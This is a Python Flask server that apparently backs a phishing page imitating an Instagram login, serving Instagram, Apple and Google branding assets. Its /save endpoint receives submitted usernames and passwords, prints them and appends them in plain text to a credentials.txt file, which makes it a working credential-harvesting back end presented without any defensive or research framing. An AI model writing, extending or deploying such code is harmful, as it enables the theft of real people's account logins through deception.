from flask import Flask, request, jsonify, send_from_directory
import os

app = Flask(__name__)

@app.route('/')
def home():
    return send_from_directory('.', 'index.html')

@app.route('/main.css')
def css():
    return send_from_directory('.', 'main.css')

@app.route('/instagram.svg')
def instagram():
    return send_from_directory('.', 'instagram.svg')

@app.route('/apple.png')
def apple():
    return send_from_directory('.', 'apple.png')

@app.route('/google.png')
def google():
    return send_from_directory('.', 'google.png')

@app.route('/save', methods=['POST'])
def save_credentials():
    data = request.get_json()
    username = data.get('username')
    password = data.get('password')

    print("Received:", username, password)

    file_path = os.path.join(os.path.dirname(__file__), "credentials.txt")
    with open(file_path, "a") as f:
        f.write(f"Username: {username}, Password: {password}\n")

    return jsonify(message="✅ Credentials saved successfully!")

if __name__ == '__main__':
    app.run(debug=True)